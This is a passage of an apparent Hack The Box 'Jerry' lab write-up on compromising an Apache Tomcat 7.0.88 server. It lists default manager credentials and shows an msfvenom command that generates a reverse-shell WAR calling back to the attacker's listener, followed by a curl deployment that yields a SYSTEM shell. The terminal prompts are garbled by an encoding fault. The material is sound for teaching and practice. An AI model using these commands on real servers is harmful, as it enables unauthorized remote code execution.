there's a web server running on port `8080`, opening it on a browser, we can see it is running `apache tomcat 7.0.88`. let's exploit this service.
The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But this path is protected by basic HTTP auth, the most common credentials are:
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
tomcat:s3cret
admin:s3cret
```

using cred `tomcat:s3cret` and boom it worked. let's get RCE by uploading a war file.

```
â”Œâ”€â”€(n16hth4wkðŸ‘½n16hth4wk-sec)-[~/Documents/HTB/Jerry]
â””â”€$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=1337 -f war -o revshell.war                               
Payload size: 1093 bytes
Final size of war file: 1093 bytes
Saved as: revshell.war
```
first we generate a war reverse shell using msfvenom. now let's deploy the war file.

```
â”Œâ”€â”€(n16hth4wkðŸ‘½n16hth4wk-sec)-[~/Documents/HTB/Jerry]
â””â”€$ curl --upload-file revshell.war -u 'tomcat:s3cret' "http://10.10.10.95:8080/manager/text/deploy?path=/revshell"
OK - Deployed application at context path /revshell
```
first we deployed the war file using curl.

after deploying the file, used curl to trigger the reverse shell and boom we got a  reverse shell as `nt authority\system`
